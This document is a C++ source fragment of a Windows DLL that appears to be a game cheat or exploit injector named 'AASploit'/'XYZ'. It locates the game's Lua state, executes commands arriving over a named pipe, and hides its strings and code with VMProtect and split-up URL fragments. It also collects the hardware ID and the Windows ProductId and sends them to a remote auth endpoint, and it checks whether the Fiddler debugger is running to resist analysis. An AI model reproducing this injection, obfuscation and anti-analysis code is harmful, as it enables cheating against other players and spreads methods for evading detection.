		PIPE_ACCESS_DUPLEX | PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,   // FILE_FLAG_FIRST_PIPE_INSTANCE is not needed but forces CreateNamedPipe(..) to fail if the pipe already exists...
		PIPE_WAIT,
		1,
		1024 * 16,
		1024 * 16,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
		{
			while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)
			{
				/* add terminating zero */
				buffer[dwRead] = '\0';
				HandleCommand(buffer);
				/* do something with data in buffer */
				printf("%s", buffer);
			}
		}

		DisconnectNamedPipe(hPipe);
	}
}



void StartXYZ() {
	VMProtectBeginUltra("krj29wsp03isa");
	//new Rosin::Form("ROSINV2_KEK", "AASploit v2.2.1", (Rosin::OnLoad)[](Rosin::Form* arg1)->void {
	//Rosin::Form::GetBaseInst()->OutputText("Scanning...\n", RGB(255, 0, 0));
	//CreateConsoleAlternative();
	RescanAlternative(); Bypass = 1;
	DataModel = GetParent(ScriptContext);
	if (DataModel <= 0) {
		RescanAlternative();//RescanADDR();//
		DataModel = GetParent(ScriptContext);
	}
	Workspace = FindFirstClass(DataModel, "Workspace");
	Lighting = FindFirstClass(DataModel, "Lighting");
	ReplicatedStorage = Lighting;
	Players = FindFirstClass(DataModel, "Players");
	//Teams = FindFirstClass(DataModel, "Teams");
	LocalPlayer = GetLocalPlayer(Players);
	int ns = OpenState();
	//Rosin::Form::GetBaseInst()->OutputText("OK!\n", RGB(0, 150, 0));
	//Rosin::Form::GetBaseInst()->OutputText("Checking Whitelist... Free Trial!\n", RGB(147, 112, 219));
	std::cout << "LuaState: " << std::hex << luaState << "\n";
	//if (CheckForMali() != false) return Crash();
	InitiateWindow();
	VMProtectEnd();
	//});
	
}

/////////////////

std::string GetHardwareId() {
	VMProtectBeginMutation("kr19nfagfkcaz");
	if (GetCurrentHwProfile(&hwProfileInfo) != NULL) {
		VMProtectEnd();
		return hwProfileInfo.szHwProfileGuid;
	}
	return "0";
}

std::string GetProductId() {
	VMProtectBeginMutation("dnh2iwoafl15");
	TCHAR value[255];
	DWORD BufferSize = 255;
	HKEY key = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, VMProtectDecryptStringA("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &key);
	int a = RegGetValue(key, "", VMProtectDecryptStringA("ProductId"), RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
	VMProtectEnd();
	return value;
}

void OutdatedCheck() {//std::string AssignedUsername) {
	VMProtectBeginMutation("owsnak1o1i4ps");
	std::string fiah98wfhh8fweaja = std::string("ht") + std::string("tp") + std::string(":") + std::string("//") + std::string("ed") + std::string("uf") + std::string("ee") + std::string("dba") + std::string("ck.") + std::string("or") + std::string("g/") + std::string("v") + std::string("er") + std::string("si") + std::string("on1.") + std::string("t") + std::string("xt");
	std::string ReturnedVersion = HttpGet(fiah98wfhh8fweaja.c_str());//GetHttpXYZ("/version.txt");
	std::string returnV = ReturnedVersion;

	std::size_t LatestVersion = returnV.find(XYZ_VERSION);
	std::size_t OldVersion = returnV.find(OLD_XYZ_VERSION);
	//std::size_t OlderVersion = returnV.find(OLDER_XYZ_VERSION);

	if (LatestVersion != std::string::npos || OldVersion != std::string::npos) {
		SecurityCheck = 1;
	}
	else {
		MessageBoxA(NULL, "You seem to be running a outdated version of XYZ.\r\n"
			"To automatically receive the lastest XYZ update simply open BitSync.\r\n",
			"XYZ Outdated Notice", MB_ICONINFORMATION);
		Crash();
	}
	VMProtectEnd();
}

BOOL ProcessRunning(const char* name) {
	VMProtectBeginMutation("kjd239snafl35");
	HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (SnapShot == INVALID_HANDLE_VALUE)
		VMProtectEnd();
		return FALSE;

	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(SnapShot, &procEntry))
		return FALSE;

	do {
		if (strcmp(procEntry.szExeFile, name) == 0)
			return TRUE;
	} while (Process32Next(SnapShot, &procEntry));
	CloseHandle(SnapShot);
	return FALSE;
}

BOOL IsFiddlerPresent() {
	VMProtectBeginMutation("mdk27ndka42");
	if (ProcessRunning(VMProtectDecryptStringA("Fiddler.exe"))) {
		VMProtectEnd();
		return TRUE;
	}
	if (FindWindow(NULL, (LPCSTR)VMProtectDecryptStringA("Fiddler Web Debugger"))) {
		return TRUE;
	}
	return FALSE;
}

std::string rr09w2dfhjiownf = std::string("&") + std::string("a") + std::string("u") + std::string("th") + std::string("=");

std::string AuthenticateUser(int uid, std::string authTicket, std::string auth_hash) {
	VMProtectBeginMutation("bj2bfchg28rfna");
	//std::string aComputerName = _GetComputerName();
	const std::string aHWID = GetHardwareId();
	const std::string aProductId = GetProductId();
	const std::string pfgajwfj0a9f90hfiiafjpafa0jw = std::string("/") + std::string("a") + std::string("u") + std::string("t") + std::string("h") + std::string(".") + std::string("p") + std::string("h") + std::string("p");
	const std::string qfbiwiofghpzodgjfe9oza9wefj = std::string("ht") + std::string("tp") + std::string(":") + std::string("//") + std::string("ed") + std::string("uf") + std::string("ee") + std::string("dba") + std::string("ck.") + std::string("or") + std::string("g/");
	const std::string LinkSetup = qfbiwiofghpzodgjfe9oza9wefj + pfgajwfj0a9f90hfiiafjpafa0jw + VMProtectDecryptStringA("?u=") + std::to_string(uid) + rr09w2dfhjiownf + authTicket + VMProtectDecryptStringA("&hwid=") + aHWID + VMProtectDecryptStringA("&soc=") + aProductId; /* + VMProtectDecryptStringA("&pid=") + std::to_string(PlaceId);*/
	const std::string returnedstring = HttpGet(LinkSetup);//DownloadURL(LinkSetup.c_str());
	const char* returnedbuff = returnedstring.c_str();
	VMProtectEnd();
	return returnedbuff;
}

/*BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpvReserved) {*/
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpvReserved) {
	VMProtectBeginMutation("lsj4s81hanxlt3");
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		hInst = hModule;
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&StartXYZ, NULL, 0, 0);
		break;
	case DLL_THREAD_ATTACH: break;
	case DLL_THREAD_DETACH:
		//CalledExit = 1;
		break;
	case DLL_PROCESS_DETACH:
		CalledExit = 1;
		break;
	}
	VMProtectEnd();
	return TRUE;
}

/*
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpvReserved) {
//int __stdcall DllMain(HMODULE hModule, DWORD dwReason, void* Useless) {
if (dwReason == DLL_PROCESS_ATTACH || dwReason == 1) {
//MessageBox(0, "Press 'OK' to start XYZ.", "XYZ Startup", MB_ICONINFORMATION | MB_OK);
DisableThreadLibraryCalls(hModule);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&StartXYZ, NULL, 0, 0);
}
return 1;
}
*/